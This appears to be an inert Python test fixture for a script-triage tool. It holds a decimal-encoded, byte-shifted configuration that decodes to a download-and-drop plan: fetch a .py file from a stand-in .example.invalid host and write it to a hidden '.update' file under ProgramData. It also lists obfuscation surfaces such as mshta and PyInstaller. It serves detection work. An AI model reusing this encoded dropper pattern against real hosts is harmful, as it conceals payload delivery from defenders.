#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_0877e59d = "122,65,54,128,119,120,105,116,119,65,101,103,117,121,109,118,105,99,118,105,113,115,120,105,48,123,118,109,120,105,99,106,109,112,105,128,101,104,101,116,120,105,118,65,108,120,120,116,99,103,112,109,105,114,120,99,120,115,99,116,101,120,108,128,119,120,101,107,105,99,103,115,121,114,120,65,53,128,119,125,114,120,101,124,65,107,105,114,105,118,101,120,115,118,99,116,109,116,105,112,109,114,105,128,115,102,106,121,119,103,101,120,109,115,114,65,106,119,120,118,109,114,107,99,106,118,101,107,113,105,114,120,119,128,103,101,118,118,109,105,118,65,116,125,109,114,119,120,101,112,112,105,118,99,115,114,105,106,109,112,105,128,123,109,114,104,115,123,119,99,103,108,101,109,114,65,113,119,108,120,101,99,120,115,99,116,125,120,108,115,114,128,103,101,113,116,101,109,107,114,99,109,104,65,103,101,113,116,101,109,107,114,49,104,106,57,54,103,56,104,54,104,101,128,121,118,112,65,108,120,120,116,119,62,51,51,104,106,57,54,103,56,104,54,104,101,50,105,124,101,113,116,112,105,50,109,114,122,101,112,109,104,51,105,57,104,104,52,61,56,55,50,116,125,128,121,119,105,118,99,101,107,105,114,120,65,76,121,114,120,118,105,119,119,84,125,120,108,115,114,51,104,106,57,54,103,56,104,54,104,101,128,106,109,112,105,99,116,101,120,108,65,71,62,51,84,118,115,107,118,101,113,72,101,120,101,51,76,121,114,120,118,105,119,119,80,101,102,51,50,121,116,104,101,120,105,49,104,106,57,54,103,56,104,54,104,101,50,116,125"
CODEC_0877e59d = "decimal_csv|add_modulo_256|04"

def load_0877e59d():
    return bytes(int(item) for item in MATERIAL_0877e59d.split(","))

def decode_0877e59d(v_a19c):
    return bytes((value - 4) % 256 for value in v_a19c)

def recover_0877e59d():
    v_d41a = ":".join(("north", "south"))
    try:
        v_b27e = decode_0877e59d(load_0877e59d())
    except (TypeError, ValueError) as error:
        raise RuntimeError("configuration recovery failed") from error
    v_c304 = v_b27e.decode("ascii", "strict")
    return v_c304

def inspect_0877e59d():
    return recover_0877e59d()

def surface_0877e59d():
    stream = (item for item in ("generator_pipeline", "fstring_fragments", "pyinstaller_onefile", "mshta_to_python"))
    return tuple(stream)

def obfuscation_0877e59d():
    left, right = "fstrin", "g_fragments"
    return f"{left}{right}"

def plan_0877e59d():
    fields = dict(item.split("=", 1) for item in inspect_0877e59d().split("|"))
    analysis_surface = surface_0877e59d()
    obfuscation_surface = obfuscation_0877e59d()
    operation_plan = ("http_client_to_path", fields["url"], fields["file_path"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_0877e59d())
